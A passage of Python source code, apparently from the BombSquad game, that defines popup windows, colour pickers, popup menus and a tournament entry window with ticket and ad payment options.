        elif selName == 'iDevices':
            sel = self._iDevicesButton
        elif selName == 'PS3':
            sel = self._ps3Button
        elif selName == 'xbox360':
            sel = self._xbox360Button
        elif selName == 'Wiimotes':
            sel = self._wiimotesButton
        elif selName == 'Back':
            sel = self._backButton
        else:
            sel = (self._gamePadsButton if self._gamePadsButton is not None
                   else self._backButton)
        bs.containerWidget(edit=self._rootWidget, selectedChild=sel)

    def _back(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = SettingsWindow(
            transition='inLeft').getRootWidget()


class PopupWindow(Window):

    def __init__(
            self, position, size, scale=1.0, offset=(0, 0),
            bgColor=(0.35, 0.55, 0.15),
            focusPosition=(0, 0),
            focusSize=None, toolbarVisibility="MENU_MINIMAL_NOBACK"):
        if focusSize is None:
            focusSize = size

        # in vr mode we can't have windows going outside the screen...
        if bs.getEnvironment()['vrMode']:
            focusSize = size
            focusPosition = (0, 0)

        width = focusSize[0]
        height = focusSize[1]

        # ok, we've been given a desired width, height, and scale;
        # we now need to ensure that we're all onscreen by scaling down if
        # need be and clamping it to the UI bounds
        bounds = bs.getUIBounds()
        edgeBuffer = 15
        boundsWidth = (bounds[1]-bounds[0]-edgeBuffer*2)
        boundsHeight = (bounds[3]-bounds[2]-edgeBuffer*2)

        finWidth = width * scale
        finHeight = height * scale
        if finWidth > boundsWidth:
            scale /= (finWidth/boundsWidth)
            finWidth = width * scale
            finHeight = height * scale
        if finHeight > boundsHeight:
            scale /= (finHeight/boundsHeight)
            finWidth = width * scale
            finHeight = height * scale

        xMin = bounds[0]+edgeBuffer+finWidth*0.5
        yMin = bounds[2]+edgeBuffer+finHeight*0.5
        xMax = bounds[1]-edgeBuffer-finWidth*0.5
        yMax = bounds[3]-edgeBuffer-finHeight*0.5

        xFin = min(max(xMin, position[0]+offset[0]), xMax)
        yFin = min(max(yMin, position[1]+offset[1]), yMax)

        # ok, we've calced a valid x/y position and a scale based on or
        # focus area. ..now calc the difference between the center of our
        # focus area and the center of our window to come up with the
        # offset we'll need to plug in to the window
        xOffs = ((focusPosition[0]+focusSize[0]*0.5) - (size[0]*0.5)) * scale
        yOffs = ((focusPosition[1]+focusSize[1]*0.5) - (size[1]*0.5)) * scale

        self._rootWidget = bs.containerWidget(
            transition='inScale', scale=scale,
            toolbarVisibility=toolbarVisibility, size=size,
            parent=bsInternal._getSpecialWidget('overlayStack'),
            stackOffset=(xFin - xOffs, yFin - yOffs),
            scaleOriginStackOffset=(position[0],
                                    position[1]),
            onOutsideClickCall=self.onPopupCancel, claimOutsideClicks=True,
            color=bgColor, onCancelCall=self.onPopupCancel)

    def onPopupCancel(self):
        pass


class ColorPicker(PopupWindow):

    """ pops up a ui to select from a set of colors.
    passes the color to the delegate's colorPickerSelectedColor() method """

    cRaw = bsUtils.getPlayerColors()
    if len(cRaw) != 16:
        raise Exception("expected 16 player colors")
    colors = [cRaw[0:4],
              cRaw[4:8],
              cRaw[8:12],
              cRaw[12:16]]

    def __init__(
            self, parent, position, initialColor=(1, 1, 1),
            delegate=None, scale=None, offset=(0, 0),
            tag=''):
        if scale is None:
            scale = 2.3 if gSmallUI else 1.65 if gMedUI else 1.23
        self._parent = parent
        self._position = position
        self._scale = scale
        self._offset = offset
        self._delegate = delegate
        self._transitioningOut = False
        self._tag = tag
        self._initialColor = initialColor

        # creates our _rootWidget
        PopupWindow.__init__(
            self, position=position, size=(210, 240),
            scale=scale, focusPosition=(10, 10),
            focusSize=(190, 220),
            bgColor=(0.5, 0.5, 0.5),
            offset=offset)
        rows = []
        closestDist = 9999
        closest = (0, 0)
        for y in range(4):
            row = []
            rows.append(row)
            for x in range(4):
                color = self.colors[y][x]
                dist = (abs(color[0] - initialColor[0])
                        + abs(color[1] - initialColor[1])
                        + abs(color[2] - initialColor[2]))
                if dist < closestDist:
                    closest = (x, y)
                    closestDist = dist
                b = bs.buttonWidget(parent=self._rootWidget,
                                    position=(22 + 45 * x, 185 - 45 * y),
                                    size=(35, 40),
                                    label='', buttonType='square',
                                    onActivateCall=bs.WeakCall(
                                        self._select, x, y),
                                    autoSelect=True, color=color,
                                    extraTouchBorderScale=0.0)
                row.append(b)
        otherButton = bs.buttonWidget(
            parent=self._rootWidget, position=(105 - 60, 13),
            color=(0.7, 0.7, 0.7),
            textScale=0.5, textColor=(0.8, 0.8, 0.8),
            size=(120, 30),
            label=bs.Lstr(
                resource='otherText',
                fallbackResource='coopSelectWindow.customText'),
            autoSelect=True, onActivateCall=bs.WeakCall(self._selectOther))
        # custom colors are limited to pro currently
        if not bsUtils._havePro():
            bs.imageWidget(parent=self._rootWidget, position=(50, 12), size=(
                30, 30), texture=bs.getTexture('lock'),
                           drawController=otherButton)

        # if their color is close to one of our swatches, select it;
        # otherwise select 'other'
        if closestDist < 0.03:
            bs.containerWidget(
                edit=self._rootWidget,
                selectedChild=rows[closest[1]][closest[0]])
        else:
            bs.containerWidget(edit=self._rootWidget, selectedChild=otherButton)

    def getTag(self):
        return self._tag

    def _selectOther(self):
        # requires pro
        if not bsUtils._havePro():
            PurchaseWindow(items=['pro'])
            self._transitionOut()
            return
        else:
            ColorPickerExact(
                parent=self._parent, position=self._position,
                initialColor=self._initialColor, delegate=self._delegate,
                scale=self._scale, offset=self._offset, tag=self._tag)
            # new picker now 'owns' the delegate; we shouldn't send it any
            # more messages
            self._delegate = None
            self._transitionOut()

    def _select(self, x, y):
        if self._delegate:
            self._delegate.colorPickerSelectedColor(self, self.colors[y][x])
        bs.realTimer(50, self._transitionOut)

    def _transitionOut(self):
        if not self._transitioningOut:
            self._transitioningOut = True
            if self._delegate is not None:
                self._delegate.colorPickerClosing(self)
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def onPopupCancel(self):
        if not self._transitioningOut:
            bs.playSound(bs.getSound('swish'))
        self._transitionOut()


class ColorPickerExact(PopupWindow):

    """ pops up a ui to select from a set of colors.
    passes the color to the delegate's colorPickerSelectedColor() method """

    cRaw = bsUtils.getPlayerColors()
    if len(cRaw) != 16:
        raise Exception("expected 16 player colors")
    colors = [cRaw[0:4],
              cRaw[4:8],
              cRaw[8:12],
              cRaw[12:16]]

    def __init__(
            self, parent, position, initialColor=(1, 1, 1),
            delegate=None, scale=None, offset=(0, 0),
            tag=''):
        if scale is None:
            scale = 2.3 if gSmallUI else 1.65 if gMedUI else 1.23
        self._delegate = delegate
        self._transitioningOut = False
        self._tag = tag
        self._color = list(initialColor)
        self._lastPressTime = bs.getRealTime()
        self._changeSpeed = 1.0
        width = 180
        height = 240

        # creates our _rootWidget
        PopupWindow.__init__(
            self, position=position, size=(width, height),
            scale=scale, focusPosition=(10, 10),
            focusSize=(width - 20, height - 20),
            bgColor=(0.5, 0.5, 0.5),
            offset=offset)
        self._swatch = bs.imageWidget(
            parent=self._rootWidget, position=(width * 0.5 - 50, height - 70),
            size=(100, 70),
            texture=bs.getTexture('buttonSquare'),
            color=(1, 0, 0))
        x = 50
        y = height-90
        for colorName, colorVal in [
            ('R', (1, 0.15, 0.15)),
            ('G', (0.15, 1, 0.15)),
                ('B', (0.15, 0.15, 1))]:
            t = bs.textWidget(
                parent=self._rootWidget, position=(x - 10, y),
                size=(0, 0),
                hAlign='center', color=colorVal, vAlign='center', text='0.12')
            setattr(self, '_label'+colorName, t)
            for bLabel, bh, binc in [('-', 30, False), ('+', 75, True)]:
                b = bs.buttonWidget(
                    parent=self._rootWidget, position=(x + bh, y - 15),
                    scale=0.8, repeat=True, textScale=1.3, size=(40, 40),
                    label=bLabel, autoSelect=True, enableSound=False,
                    onActivateCall=bs.WeakCall(
                        self._colorChangePress, colorName, binc))
            y -= 42

        b = bs.buttonWidget(
            parent=self._rootWidget, position=(width * 0.5 - 40, 10),
            size=(80, 30),
            textScale=0.6, color=(0.6, 0.6, 0.6),
            textColor=(0.7, 0.7, 0.7),
            label=bs.Lstr(resource='doneText'),
            onActivateCall=bs.WeakCall(self._transitionOut),
            autoSelect=True)
        bs.containerWidget(edit=self._rootWidget, startButton=b)

        # unlike the swatch picker, we stay open and constantly push our
        # color to the delegate, so start doing that...
        self._updateForColor()

    def _updateForColor(self):
        if not self._rootWidget.exists():
            return
        bs.imageWidget(edit=self._swatch, color=self._color)
        bs.textWidget(edit=self._labelR, text='%.2f' % self._color[0])
        bs.textWidget(edit=self._labelG, text='%.2f' % self._color[1])
        bs.textWidget(edit=self._labelB, text='%.2f' % self._color[2])
        if self._delegate is not None:
            self._delegate.colorPickerSelectedColor(self, self._color)

    def _colorChangePress(self, colorName, increasing):
        # if we get rapid-fire presses, eventually start moving faster
        currentTime = bs.getRealTime()
        sinceLast = currentTime - self._lastPressTime
        if (sinceLast < 200 and self._lastPressColorName == colorName
                and self._lastPressIncreasing == increasing):
            self._changeSpeed += 0.25
        else:
            self._changeSpeed = 1.0
        self._lastPressTime = currentTime
        self._lastPressColorName = colorName
        self._lastPressIncreasing = increasing

        colorIndex = ('R', 'G', 'B').index(colorName)
        offs = int(self._changeSpeed) * (0.01 if increasing else -0.01)
        self._color[colorIndex] = max(
            0.0, min(1.0, self._color[colorIndex] + offs))
        self._updateForColor()

    def getTag(self):
        return self._tag

    def _transitionOut(self):
        if not self._transitioningOut:
            self._transitioningOut = True
            if self._delegate is not None:
                self._delegate.colorPickerClosing(self)
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def onPopupCancel(self):
        if not self._transitioningOut:
            bs.playSound(bs.getSound('swish'))
        self._transitionOut()


class PopupMenuWindow(PopupWindow):

    def __init__(
            self, position, choices, currentChoice, delegate=None, width=230,
            maxWidth=None, scale=1.0, choicesDisabled=[],
            choicesDisplay=[],
            autoSelect=None):

        # FIXME - for the moment we base our width on these strings so we
        # need to flatten them
        choicesDisplayNew = []
        for choice in choicesDisplay:
            if type(choice) is bs.Lstr:
                choicesDisplayNew.append(choice.evaluate())
            else:
                bs.printErrorOnce(
                    'PopupMenuWindow got a raw string in \'choicesDisplay\';'
                    ' please pass bs.Lstr values only')
                choicesDisplayNew.append(choice)
        choicesDisplay = choicesDisplayNew

        parent = None

        if maxWidth is None:
            maxWidth = width * 1.5

        self._transitioningOut = False
        self._choices = list(choices)
        self._choicesDisplay = list(choicesDisplay)
        self._currentChoice = currentChoice
        self._choicesDisabled = list(choicesDisabled)
        self._doneBuilding = False
        if len(choices) < 1:
            raise Exception("Must pass at least one choice")
        self._width = width
        self._scale = scale
        if len(choices) > 8:
            self._height = 280
            self._useScroll = True
        else:
            self._height = 20+len(choices)*33
            self._useScroll = False
        self._delegate = None  # dont want this stuff called just yet..

        # extend width to fit our longest string (or our max-width)
        for index, choice in enumerate(choices):
            if len(choicesDisplay) == len(choices):
                choiceDisplayName = choicesDisplay[index]
            else:
                choiceDisplayName = choice
            if self._useScroll:
                self._width = max(self._width, min(
                    maxWidth, bsInternal._getStringWidth(
                        choiceDisplayName, suppressWarning=True))+75)
            else:
                self._width = max(self._width, min(
                    maxWidth, bsInternal._getStringWidth(
                        choiceDisplayName, suppressWarning=True))+60)

        # init parent class - this will rescale and reposition things as
        # needed and create our root widget
        PopupWindow.__init__(self, position, size=(
            self._width, self._height), scale=self._scale)

        if self._useScroll:
            self._scrollWidget = bs.scrollWidget(
                parent=self._rootWidget, position=(20, 20),
                highlight=False, color=(0.35, 0.55, 0.15),
                size=(self._width - 40, self._height - 40))
            self._columnWidget = bs.columnWidget(parent=self._scrollWidget)
        else:
            self._offsetWidget = bs.containerWidget(
                parent=self._rootWidget, position=(30, 15),
                size=(self._width - 40, self._height),
                background=False)
            self._columnWidget = bs.columnWidget(parent=self._offsetWidget)
        for index, choice in enumerate(choices):
            if len(choicesDisplay) == len(choices):
                choiceDisplayName = choicesDisplay[index]
            else:
                choiceDisplayName = choice
            inactive = (choice in self._choicesDisabled)
            w = bs.textWidget(
                parent=self._columnWidget, size=(self._width - 40, 28),
                onSelectCall=bs.Call(self._select, index),
                clickActivate=True, color=(0.5, 0.5, 0.5, 0.5)
                if inactive
                else(
                    (0.5, 1, 0.5, 1)
                    if choice == self._currentChoice else(0.8, 0.8, 0.8, 1.0)),
                padding=0, maxWidth=maxWidth, text=choiceDisplayName,
                onActivateCall=self._activate, vAlign='center',
                selectable=False if inactive else True)
            if choice == self._currentChoice:
                bs.containerWidget(edit=self._columnWidget,
                                   selectedChild=w, visibleChild=w)

        # ok from now on our delegate can be called
        self._delegate = weakref.ref(delegate)
        self._doneBuilding = True

    def _select(self, index):
        if self._doneBuilding:
            self._currentChoice = self._choices[index]

    def _activate(self):
        bs.playSound(bs.getSound('swish'))
        bs.realTimer(50, self._transitionOut)
        delegate = self._getDelegate()
        if delegate is not None:
            # call this in a timer so it doesnt interfere with us killing
            # our widgets and whatnot..
            bs.realTimer(
                0, bs.Call(
                    delegate.popupMenuSelectedChoice, self,
                    self._currentChoice))

    def _getDelegate(self):
        return None if self._delegate is None else self._delegate()

    def _transitionOut(self):
        if not self._rootWidget.exists():
            return
        if not self._transitioningOut:
            self._transitioningOut = True
            delegate = self._getDelegate()
            if delegate is not None:
                delegate.popupMenuClosing(self)
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def onPopupCancel(self):
        if not self._transitioningOut:
            bs.playSound(bs.getSound('swish'))
        self._transitionOut()


class PopupMenu(object):
    def __init__(
            self, parent, position, choices, currentChoice=None,
            onValueChangeCall=None, openingCall=None, closingCall=None,
            width=230, maxWidth=None, scale=None, choicesDisabled=[],
            choicesDisplay=[],
            buttonSize=(160, 50),
            autoSelect=True):
        if scale is None:
            scale = 2.3 if gSmallUI else 1.65 if gMedUI else 1.23
        if currentChoice not in choices:
            currentChoice = None
        self._choices = list(choices)
        if len(choices) == 0:
            raise Exception("no choices given")
        self._choicesDisplay = list(choicesDisplay)
        self._choicesDisabled = list(choicesDisabled)
        self._width = width
        self._maxWidth = maxWidth
        self._scale = scale
        self._currentChoice = (currentChoice if currentChoice is not None
                               else self._choices[0])
        self._position = position
        self._parent = parent
        if len(choices) < 1:
            raise Exception("Must pass at least one choice")
        self._parent = parent
        self._buttonSize = buttonSize
        self._button = bs.buttonWidget(
            parent=self._parent, position=(self._position[0],
                                           self._position[1]),
            autoSelect=autoSelect, size=self._buttonSize, scale=1.0, label='',
            onActivateCall=bs.Call(bs.realTimer, 0, self._makePopup))
        self._onValueChangeCall = None  # dont wanna call it for initial set
        self._openingCall = openingCall
        self._autoSelect = autoSelect
        self._closingCall = closingCall
        self.setChoice(self._currentChoice)
        self._onValueChangeCall = onValueChangeCall
        self._windowWidget = None

    def _makePopup(self):
        if not self._button.exists():
            return
        if self._openingCall:
            self._openingCall()
        self._windowWidget = PopupMenuWindow(
            position=self._button.getScreenSpaceCenter(),
            delegate=self,
            width=self._width, maxWidth=self._maxWidth, scale=self._scale,
            choices=self._choices, currentChoice=self._currentChoice,
            choicesDisabled=self._choicesDisabled,
            choicesDisplay=self._choicesDisplay,
            autoSelect=self._autoSelect).getRootWidget()

    def getButtonWidget(self):
        return self._button

    def getWindowWidget(self):
        return self._windowWidget

    def popupMenuSelectedChoice(self, popupWindow, choice):
        self.setChoice(choice)
        if self._onValueChangeCall:
            self._onValueChangeCall(choice)

    def popupMenuClosing(self, popupWindow):
        if self._button.exists():
            bs.containerWidget(edit=self._parent, selectedChild=self._button)
        self._windowWidget = None
        if self._closingCall:
            self._closingCall()

    def setChoice(self, choice):
        self._currentChoice = choice
        if len(self._choicesDisplay) == len(self._choices):
            displayName = self._choicesDisplay[self._choices.index(choice)]
        else:
            displayName = choice
        if self._button.exists():
            bs.buttonWidget(edit=self._button, label=displayName)

    def _transitionOut(self):
        if not self._transitioningOut:
            self._transitioningOut = True
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def _onCancel(self):
        self._transitionOut()

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._onCancel()


class TournamentEntryWindow(PopupWindow):

    def __init__(
            self, tournamentID, tournamentActivity=None, position=(0, 0),
            delegate=None, scale=None, offset=(0, 0),
            onCloseCall=None):

        bsInternal._setAnalyticsScreen('Tournament Entry Window')

        self._tournamentID = tournamentID
        self._tournamentInfo = gTournamentInfo[self._tournamentID]

        # set a few vars depending on the tourney fee
        self._fee = self._tournamentInfo['fee']
        self._allowAds = self._tournamentInfo['allowAds']
        if self._fee == 4:
            self._purchaseName = 'tournament_entry_4'
            self._purchasePriceName = 'price.tournament_entry_4'
        elif self._fee == 3:
            self._purchaseName = 'tournament_entry_3'
            self._purchasePriceName = 'price.tournament_entry_3'
        elif self._fee == 2:
            self._purchaseName = 'tournament_entry_2'
            self._purchasePriceName = 'price.tournament_entry_2'
        elif self._fee == 1:
            self._purchaseName = 'tournament_entry_1'
            self._purchasePriceName = 'price.tournament_entry_1'
        else:
            if self._fee != 0:
                raise Exception("invalid fee: "+str(self._fee))
            self._purchaseName = 'tournament_entry_0'
            self._purchasePriceName = 'price.tournament_entry_0'

        self._purchasePrice = None

        self._onCloseCall = onCloseCall
        if scale is None:
            scale = 2.3 if gSmallUI else 1.65 if gMedUI else 1.23
        self._delegate = delegate
        self._transitioningOut = False

        self._tournamentActivity = tournamentActivity

        self._width = 340
        self._height = 220

        bgColor = (0.5, 0.4, 0.6)

        # creates our _rootWidget
        PopupWindow.__init__(
            self, position=position, size=(self._width, self._height),
            scale=scale, bgColor=bgColor, offset=offset,
            toolbarVisibility='MENU_CURRENCY')

        self._lastAdPressTime = -9999
        self._lastTicketPressTime = -9999
        self._entering = False
        self._launched = False

        env = bs.getEnvironment()

        # show the ad button only if we support ads *and* it has a level 1 fee
        self._doAdButton = (bsInternal._hasVideoAds() and self._allowAds)

        xOffs = 0 if self._doAdButton else 85

        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, position=(20, self._height - 30),
            size=(50, 50),
            scale=0.5, label='', color=bgColor, onActivateCall=self._onCancel,
            autoSelect=True, icon=bs.getTexture('crossOut'),
            iconScale=1.2)

        self._titleText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 20),
            size=(0, 0),
            hAlign='center', vAlign='center', scale=0.6, text=bs.Lstr(
                resource='tournamentEntryText'),
            maxWidth=200, color=(1, 1, 1, 0.4))

        b = self._payWithTicketsButton = bs.buttonWidget(
            parent=self._rootWidget, position=(30 + xOffs, 60),
            autoSelect=True, buttonType='square', size=(120, 120),
            label='', onActivateCall=self._onPayWithTicketsPress)
        self._ticketImagePosition = (50+xOffs, 94)
        self._ticketImagePositionFree = (50+xOffs, 80)
        self._ticketImage = bs.imageWidget(
            parent=self._rootWidget, drawController=b, size=(80, 80),
            position=self._ticketImagePosition,
            texture=bs.getTexture('tickets'))
        self._ticketCostTextPosition = (87+xOffs, 88)
        self._ticketCostTextPositionFree = (87+xOffs, 120)
        self._ticketCostText = bs.textWidget(
            parent=self._rootWidget, drawController=b,
            position=self._ticketCostTextPosition, size=(0, 0),
            hAlign='center', vAlign='center', scale=0.6, text='', maxWidth=95,
            color=(0, 1, 0))
        self._freePlaysRemainingText = bs.textWidget(
            parent=self._rootWidget, drawController=b, position=(87 + xOffs, 78),
            size=(0, 0),
            hAlign='center', vAlign='center', scale=0.33, text='', maxWidth=95,
            color=(0, 0.8, 0))
        if self._doAdButton:

            b = self._payWithAdButton = bs.buttonWidget(
                parent=self._rootWidget, position=(190, 60),
                autoSelect=True, buttonType='square', size=(120, 120),
                label='', onActivateCall=self._onPayWithAdPress)
            self._payWithAdImage = bs.imageWidget(
                parent=self._rootWidget, drawController=b, size=(80, 80),
                position=(210, 94),
                texture=bs.getTexture('tv'))

            self._adTextPosition = (251, 88)
            self._adTextPositionRemaining = (251, 92)
            haveAdTriesRemaining = True if self._tournamentInfo[
                'adTriesRemaining'] is not None else False
            self._adText = bs.textWidget(
                parent=self._rootWidget, drawController=b,
                position=self._adTextPositionRemaining
                if haveAdTriesRemaining else self._adTextPosition, size=(0, 0),
                hAlign='center', vAlign='center', scale=0.6, text=bs.Lstr(
                    resource='watchAVideoText',
                    fallbackResource='watchAnAdText'),
                maxWidth=95, color=(0, 1, 0))
            adPlaysRemainingText = '' if not haveAdTriesRemaining else '' + \
                str(self._tournamentInfo['adTriesRemaining'])
            self._adPlaysRemainingText = bs.textWidget(
                parent=self._rootWidget, drawController=b, position=(251, 78),
                size=(0, 0),
                hAlign='center', vAlign='center', scale=0.33,
                text=adPlaysRemainingText, maxWidth=95, color=(0, 0.8, 0))

            bs.textWidget(
                parent=self._rootWidget, position=(self._width * 0.5, 120),
                size=(0, 0),
                hAlign='center', vAlign='center', scale=0.6, text=bs.Lstr(
                    resource='orText', subs=[('${A}', ''),
                                             ('${B}', '')]),
                maxWidth=35, color=(1, 1, 1, 0.5))
        else:
            self._payWithAdButton = None

        if not gToolbars:
            self._getTicketsButton = bs.buttonWidget(
                parent=self._rootWidget, position=(self._width - 190 + 110, 15),
                autoSelect=True, scale=0.6, size=(120, 60),
                textColor=(0.2, 1, 0.2),
                label=bs.getSpecialChar('ticket'),
                color=(0.6, 0.4, 0.7),
                onActivateCall=self._onGetTicketsPress)
        else:
            self._getTicketsButton = None

        self._secondsRemaining = None

        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton)

        # lets also ask the server for info about this tournament
        # (time remaining, etc) so we can show the user time remaining,
        # disallow entry if time has run out/etc.
        xoffs = 104 if gToolbars else 0
        self._timeRemainingText = bs.textWidget(
            parent=self._rootWidget, position=(70 + xoffs, 23),
            size=(0, 0),
            hAlign='center', vAlign='center', text='-', scale=0.65,
            maxWidth=100, flatness=1.0, color=(0.7, 0.7, 0.7))
        self._timeRemainingLabelText = bs.textWidget(
            parent=self._rootWidget, position=(70 + xoffs, 40),
            size=(0, 0),
            hAlign='center', vAlign='center', text=bs.Lstr(
                resource='coopSelectWindow.timeRemainingText'),
            scale=0.45, flatness=1.0, maxWidth=100, color=(0.7, 0.7, 0.7))

        self._lastQueryTime = None

        # if there seems to be a relatively-recent valid cached info for this
        # tournament, use it.
        # ..otherwise we'll kick off a query ourselves.
        if (self._tournamentID in gTournamentInfo
            and gTournamentInfo[self._tournamentID]['valid']
            and (bs.getRealTime() - gTournamentInfo[self._tournamentID]
                 ['timeReceived'] < 1000*60*5)):
            try:
                info = gTournamentInfo[self._tournamentID]
                self._secondsRemaining = max(
                    0, info['timeRemaining'] -
                    int((bs.getRealTime() - info['timeReceived']) / 1000))
                self._haveValidData = True
                self._lastQueryTime = bs.getRealTime()
            except Exception:
                bs.printException("error using valid tourney data")
                self._haveValidData = False
        else:
            self._haveValidData = False

        self._fgState = bsUtils.gAppFGState
        self._runningQuery = False
        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            repeat=True, timeType='real')
        self._update()
        self._restore_state()

    def _onTournamentQueryResponse(self, data):
        self._runningQuery = False
        if data is not None:
            data = data['t']  # this used to be the whole payload
            _cacheTournamentInfo(data)
            self._secondsRemaining = gTournamentInfo[self._tournamentID][
                'timeRemaining']
            self._haveValidData = True

    def _save_state(self):
        if not self._rootWidget.exists():
            return
        sel = self._rootWidget.getSelectedChild()
        if sel == self._payWithAdButton:
            selName = 'Ad'
        else:
            selName = 'Tickets'
        bs.getConfig()['Tournament Pay Selection'] = selName
        bs.writeConfig()

    def _restore_state(self):
        try:
            selName = bs.getConfig()['Tournament Pay Selection']
        except Exception:
            selName = 'Tickets'
        if selName == 'Ad' and self._payWithAdButton is not None:
            sel = self._payWithAdButton
        else:
            sel = self._payWithTicketsButton
        bs.containerWidget(edit=self._rootWidget, selectedChild=sel)

    def _update(self):

        # we may outlive our widgets..
        if not self._rootWidget.exists():
            return

        # if we've been foregrounded/backgrounded we need to re-grab data
        if self._fgState != bsUtils.gAppFGState:
            self._fgState = bsUtils.gAppFGState
            self._haveValidData = False

        # if we need to run another tournament query, do so..
        if not self._runningQuery and(
            (self._lastQueryTime is None)
            or(not self._haveValidData)
                or(bs.getRealTime() - self._lastQueryTime > 30000)):
            bsInternal._tournamentQuery(
                args={'source': 'entry window'
                      if self._tournamentActivity is None else
                      'retry entry window'},
                callback=bs.WeakCall(self._onTournamentQueryResponse))
            self._lastQueryTime = bs.getRealTime()
            self._runningQuery = True

        # grab the latest info on our tourney
        self._tournamentInfo = gTournamentInfo[self._tournamentID]

        # if we dont have valid data always show a '-' for time
        if not self._haveValidData:
            bs.textWidget(edit=self._timeRemainingText, text='-')
        else:
            if self._secondsRemaining is not None:
                self._secondsRemaining = max(0, self._secondsRemaining - 1)
                bs.textWidget(edit=self._timeRemainingText,
                              text=bsUtils.getTimeString(
                                  self._secondsRemaining * 1000, centi=False))

        # keep price up-to-date and update the button with it..
        self._purchasePrice = bsInternal._getAccountMiscReadVal(
            self._purchasePriceName, None)

        bs.textWidget(
            edit=self._ticketCostText,
            text=(bs.Lstr(resource='getTicketsWindow.freeText')
                  if self._purchasePrice == 0 else bs.Lstr(
                      resource='getTicketsWindow.ticketsText',
                      subs=[('${COUNT}', str(self._purchasePrice)
                             if self._purchasePrice is not None else '?')])),
            position=self._ticketCostTextPositionFree
            if self._purchasePrice == 0 else self._ticketCostTextPosition,
            scale=1.0 if self._purchasePrice == 0 else 0.6)

        bs.textWidget(
            edit=self._freePlaysRemainingText, text=''
            if(
                self._tournamentInfo['freeTriesRemaining']
                in[None, 0] or self._purchasePrice != 0) else '' +
            str(self._tournamentInfo['freeTriesRemaining']))

        bs.imageWidget(edit=self._ticketImage, opacity=0.2
                       if self._purchasePrice == 0 else 1.0,
                       position=self._ticketImagePositionFree
                       if self._purchasePrice == 0 else
                       self._ticketImagePosition)

        if self._doAdButton:
            enabled = bsInternal._haveIncentivizedAd()
            haveAdTriesRemaining = True if (
                self._tournamentInfo['adTriesRemaining'] is not None
                and self._tournamentInfo['adTriesRemaining'] > 0) else False
            bs.textWidget(
                edit=self._adText, position=self._adTextPositionRemaining
                if haveAdTriesRemaining else self._adTextPosition,
                color=(0, 1, 0) if enabled else(0.5, 0.5, 0.5))
            bs.imageWidget(edit=self._payWithAdImage,
                           opacity=1.0 if enabled else 0.2)
            bs.buttonWidget(edit=self._payWithAdButton, color=(
                0.5, 0.7, 0.2) if enabled else (0.5, 0.5, 0.5))
            adPlaysRemainingText = '' if not haveAdTriesRemaining else '' + \
                str(self._tournamentInfo['adTriesRemaining'])
            bs.textWidget(edit=self._adPlaysRemainingText,
                          text=adPlaysRemainingText, color=(0, 0.8, 0)
                          if enabled else(0.4, 0.4, 0.4))

        try:
            tStr = str(bsInternal._getAccountTicketCount())
        except Exception:
            tStr = '?'
        if self._getTicketsButton is not None:
            bs.buttonWidget(edit=self._getTicketsButton,
                            label=bs.getSpecialChar('ticket')+tStr)

    def _launch(self):
        if self._launched:
            return
        self._launched = True

        launched = False

        # if they gave us an existing activity, just restart it..
        if self._tournamentActivity is not None:
            try:
                bs.realTimer(100, lambda: bs.playSound(
                    bs.getSound('cashRegister')))
                with bs.Context(self._tournamentActivity):
                    self._tournamentActivity.end(
                        {'outcome': 'restart'}, force=True)
                bs.realTimer(300, self._transitionOut)
                launched = True
                bs.screenMessage(
                    bs.Lstr(
                        translate=('serverResponses',
                                   'Entering tournament...')),
                    color=(0, 1, 0))
            # we can hit exeptions here if _tournamentActivity ends before
            # our restart attempt happens
            # ..in this case we'll fall back to launching a new session.
            # This is not ideal since players will have to rejoin, etc.
            # ..but it works for now
            except Exception:
                pass

        # if we had no existing activity (or were unable to restart it) launch a
        # new session.
        if not launched:
            bs.realTimer(100, lambda: bs.playSound(bs.getSound('cashRegister')))
            bs.realTimer(
                1000, lambda: bsUtils._handleRunChallengeGame(
                    self._tournamentInfo['game'],
                    args={'minPlayers': self._tournamentInfo['minPlayers'],
                          'maxPlayers': self._tournamentInfo['maxPlayers'],
                          'tournamentID': self._tournamentID}))
            bs.realTimer(700, self._transitionOut)
            bs.screenMessage(
                bs.Lstr(
                    translate=('serverResponses', 'Entering tournament...')),
                color=(0, 1, 0))

    def _onPayWithTicketsPress(self):

        # if we're already entering, ignore..
        if self._entering:
            return

        if not self._haveValidData:
            bs.screenMessage(
                bs.Lstr(resource='tournamentCheckingStateText'),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        # if we dont have a price..
        if self._purchasePrice is None:
            bs.screenMessage(
                bs.Lstr(resource='tournamentCheckingStateText'),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        # deny if it looks like the tourney has ended
        if self._secondsRemaining == 0:
            bs.screenMessage(
                bs.Lstr(resource='tournamentEndedText'),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        # deny if we don't have enough tickets
        try:
            ticketCount = bsInternal._getAccountTicketCount()
        except Exception:
            ticketCount = None
        ticketCost = self._purchasePrice
        if (ticketCount is not None and ticketCost is not None
                and ticketCount < ticketCost):
            showGetTicketsPrompt()
            bs.playSound(bs.getSound('error'))
            return

        curTime = bs.getRealTime()
        self._lastTicketPressTime = curTime
        bsInternal._inGamePurchase(self._purchaseName, ticketCost)

        self._entering = True
        bsInternal._addTransaction({'type': 'ENTER_TOURNAMENT',
                                    'fee': self._fee,
                                    'tournamentID': self._tournamentID})
        bsInternal._runTransactions()
        self._launch()

    def _onPayWithAdPress(self):

        # if we're already entering, ignore..
        if self._entering:
            return

        if not self._haveValidData:
            bs.screenMessage(bs.Lstr(resource='tournamentCheckingStateText'),
                             color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        # deny if it looks like the tourney has ended
        if self._secondsRemaining == 0:
            bs.screenMessage(bs.Lstr(resource='tournamentEndedText'),
                             color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        curTime = bs.getRealTime()
        if curTime-self._lastAdPressTime > 5000:
            self._lastAdPressTime = curTime
